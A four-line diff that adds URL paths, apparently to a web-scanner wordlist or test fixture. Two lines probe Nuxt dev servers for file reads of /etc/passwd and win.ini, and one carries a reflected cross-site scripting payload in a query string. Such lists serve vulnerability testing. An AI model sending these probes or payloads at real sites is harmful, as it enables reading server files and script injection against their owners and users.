@@ -1,0 +1,4 @@
+/api/users/search_authors
+/_nuxt/@fs/etc/passwd
+/_nuxt/@fs/windows/win.ini
+/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
